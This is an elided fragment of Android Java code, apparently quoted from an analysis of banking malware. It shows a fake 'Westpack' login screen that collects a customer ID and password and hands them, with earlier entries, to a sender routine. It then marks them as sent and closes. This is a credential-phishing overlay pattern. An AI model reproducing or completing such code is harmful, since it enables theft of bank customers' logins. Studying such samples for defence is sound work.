...
public class Westpack extends Activity {
	...
	protected void onCreate(Bundle savedInstanceState) {
		...
		setContentView(R.layout.westpack_fragment);
		...
		initReceiver();
		clientNumber = (EditText) findViewById(R.id.txt_customer_id);
	...
	private void sendData() {
		Sender.sendBillingData(this, "westpack", clientNumberText, passwordText, clientNumberTextOld, passwordTextOld);
	}
	...
	private void initReceiver() {
		signalsReceiver = new BroadcastReceiver() {
			...
			public void onReceive(Context context, Intent i) {
				...
				if (status) {
					Utils.putBooleanValue(settings, Constants.WESTPACK_IS_SENT, true);
					Westpack.this.finish();
				} else {
					showError();
				}
			}
